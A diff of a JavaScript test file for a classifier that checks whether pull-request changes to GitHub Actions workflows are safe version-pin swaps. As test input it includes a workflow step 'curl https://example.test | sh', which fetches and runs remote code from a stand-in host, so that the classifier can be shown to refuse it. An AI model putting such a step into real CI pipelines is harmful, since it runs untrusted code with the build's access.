@@ -3,7 +3,12 @@
 // classes Classify and Content), one for one, so the two lanes sort a pull
 // request the same way; the content-step and security cases are this lane's.
 import assert from "node:assert/strict";
+import { spawnSync } from "node:child_process";
+import { writeFileSync } from "node:fs";
+import { join } from "node:path";
 import { test } from "node:test";
+
+import { tempDir } from "../../../lib/test-tmp.mjs";
 
 import {
   classifierGaps,
@@ -1013,13 +1018,20 @@ test("every commit arrives in its own author's push", () => {
 
 const SHA_A = "a".repeat(40);
 const SHA_B = "b".repeat(40);
-const workflow = (...pairs) => [
-  {
-    filename: ".github/workflows/ci.yml",
-    status: "modified",
-    patch: ["@@ -10,3 +10,3 @@ jobs:", "     steps:", ...pairs.map(([from]) => `-      - uses: ${from}`), ...pairs.map(([, to]) => `+      - uses: ${to}`), "       with:"].join("\n"),
-  },
-];
+const ciYaml = (uses, run = "make check", extra = []) =>
+  ["on: push", "jobs:", "  ci:", "    runs-on: ubuntu-latest", "    steps:", ...uses.map((u) => `      - uses: ${u}`), `      - run: ${run}`, ...extra, ""].join("\n");
+
+function gitPatch(before, after) {
+  const dir = tempDir("pin-swap-");
+  writeFileSync(join(dir, "before.yml"), before);
+  writeFileSync(join(dir, "after.yml"), after);
+  const diff = spawnSync("git", ["diff", "--no-index", "--no-color", "before.yml", "after.yml"], { cwd: dir, encoding: "utf8" });
+  assert.equal(diff.status, 1, diff.stderr);
+  const patch = diff.stdout.slice(diff.stdout.indexOf("@@")).replace(/\n$/, "");
+  return [{ filename: ".github/workflows/ci.yml", status: "modified", patch }];
+}
+
+const workflow = (...pairs) => gitPatch(ciYaml(pairs.map(([from]) => from)), ciYaml(pairs.map(([, to]) => to)));
 
 test("an official vendor's action moving from one version tag to another is a pin swap", () => {
   for (const [from, to] of [
@@ -1064,9 +1076,9 @@ test("a third-party or first-party action off a full SHA escalates", () => {
 test("a vendor tag bump beside any other change escalates", () => {
   const vendor = ["actions/checkout@v7", "actions/checkout@v8"];
   assert.equal(pinSwapRefusal(workflow(vendor, [`evilcorp/setup-tool@${SHA_A}`, "evilcorp/setup-tool@v2"])), ".github/workflows/ci.yml:not-a-full-sha-or-vendor-tag");
-  const [file] = workflow(vendor);
-  assert.equal(pinSwapRefusal([{ ...file, patch: `${file.patch}\n+        run: curl https://example.test | sh` }]), ".github/workflows/ci.yml:lines-added-or-removed");
-  assert.equal(pinSwapRefusal([{ ...file, patch: `${file.patch}\n-      - run: make check\n+      - run: make deploy` }]), ".github/workflows/ci.yml:not-a-uses-line");
+  const [from, to] = vendor;
+  assert.equal(pinSwapRefusal(gitPatch(ciYaml([from]), ciYaml([to], "make check", ["      - run: curl https://example.test | sh"]))), ".github/workflows/ci.yml:lines-added-or-removed");
+  assert.equal(pinSwapRefusal(gitPatch(ciYaml([from]), ciYaml([to], "make deploy"))), ".github/workflows/ci.yml:not-a-uses-line");
   assert.equal(pinSwapRefusal(workflow(vendor, [`actions/setup-node@${SHA_A}`, `actions/setup-node@${SHA_B}`])), null);
 });
 
